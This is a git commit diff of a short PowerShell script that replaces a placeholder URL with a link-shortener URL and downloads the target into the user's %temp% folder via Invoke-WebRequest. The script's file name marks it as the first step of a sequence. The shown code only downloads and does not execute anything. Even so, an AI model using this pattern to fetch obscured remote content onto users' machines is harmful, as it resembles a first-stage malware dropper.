22a2fe30b9975996cfd3c0f6f9b940f56ebc660b
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-20 18:54:48 +0800

    Update 1. DL file.ps1

--- WBPV/1. DL file.ps1
+++ WBPV/1. DL file.ps1
@@ -1,8 +1,8 @@
 # Define the URL of the file to be downloaded
-$url = "https://example.com/file.zip"  # Replace with your file URL
+$url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL
 
 # Define the path to save the file in the %temp% folder
-$tempPath = [System.IO.Path]::Combine($env:TEMP, "downloaded_file.zip")  # Replace "downloaded_file.zip" with your desired filename
+$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "downloaded_file.zip" with your desired filename
 
 # Use Invoke-WebRequest to download the file
 Invoke-WebRequest -Uri $url -OutFile $tempPath
